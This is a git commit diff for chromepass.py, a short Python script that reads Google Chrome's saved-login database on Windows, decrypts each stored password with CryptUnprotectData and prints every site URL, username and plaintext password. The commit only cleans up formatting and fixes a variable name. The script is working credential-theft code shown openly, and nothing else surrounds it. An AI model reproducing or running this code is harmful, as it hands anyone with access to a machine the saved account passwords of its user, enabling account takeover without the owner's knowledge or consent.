b86a18097b42909a4b57fc1f8eaea8254de1fb0c
Justin Chase <jujowned@Gmail.com>
2014-11-05 10:44:13 -0800

    Removed Comments, and spacing, and added word to the variable pass

--- chromepass.py
+++ chromepass.py
@@ -2,15 +2,13 @@ from os import getenv
 import sqlite3
 import win32crypt
 
-appdata = getenv("APPDATA") 
+appdata = getenv("APPDATA")
 connection = sqlite3.connect(appdata + "\..\Local\Google\Chrome\User Data\Default\Login Data")
 cursor = connection.cursor()
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 for information in cursor.fetchall():
-        #chrome encrypts the password with Windows WinCrypt.
-	#Fortunately Decrypting it is no big issue.
-        password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
-	if password:
-		print 'website_link ' + information[0]
-		print 'Username: ' + information[1]
-		print 'Password: ' + pass
+    password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
+    if password:
+        print 'Website URL: ' + information[0]
+        print 'Username: ' + information[1]
+        print 'Password: ' + password
